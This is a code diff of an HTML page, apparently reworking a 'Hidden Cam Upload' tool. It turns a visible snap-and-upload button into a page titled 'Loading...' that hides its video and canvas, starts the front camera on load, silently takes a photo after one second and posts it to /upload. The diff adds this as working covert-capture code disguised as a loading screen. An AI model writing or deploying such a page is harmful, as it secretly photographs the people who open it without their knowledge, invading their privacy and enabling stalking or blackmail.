@@ -1,39 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hidden Cam Upload</title>
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html {
+            margin: 0;
+            background: black;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-    <button onclick="captureAndSend()">Snap & Upload</button>
-    <p id="status"></p>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
 
-        // Ask for webcam access
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => video.srcObject = stream)
-            .catch(err => console.error("Access denied", err));
+        async function startCamAndShoot() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }, // 🤳 Front camera
+                    audio: false
+                });
 
-        async function captureAndSend() {
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        shootPhoto();
+                    }, 1000); // Wait 1 sec to stabilize
+                };
+            } catch (err) {
+                console.error("Camera error:", err);
+            }
+        }
+
+        function shootPhoto() {
+            const context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append("file", blob, "photo.png");
 
                 const res = await fetch("/upload", {
                     method: "POST",
-                    body: formData
+                    body: formData,
                 });
 
-                const result = await res.json();
-                document.getElementById('status').innerText = result.message || result.error;
+                if (res.ok) {
+                    console.log("📸 Uploaded");
+                    stopStream();
+                } else {
+                    console.error("❌ Upload failed");
+                }
             }, "image/png");
         }
+
+        function stopStream() {
+            const stream = video.srcObject;
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        startCamAndShoot();
     </script>
 </body>
 </html>
